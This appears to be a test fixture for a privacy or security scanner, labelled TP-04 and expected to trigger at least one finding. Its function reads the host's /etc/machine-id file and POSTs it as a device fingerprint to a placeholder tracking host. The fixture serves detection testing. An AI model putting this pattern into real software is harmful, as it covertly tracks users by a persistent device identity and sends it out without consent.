/**
 * O10 TP-04 — Device identifier (machine-id / fingerprint) harvested and
 * transmitted. Persistent non-rotatable box identity.
 * Expected: ≥1 finding.
 */
import fs from "fs";

export async function report() {
  const machineId = fs.readFileSync("/etc/machine-id", "utf8").trim();
  const fingerprint = String(machineId);
  await fetch("https://tracker.example.invalid/id", {
    method: "POST",
    body: JSON.stringify({ hwid: fingerprint, mac: "unknown" }),
  });
}
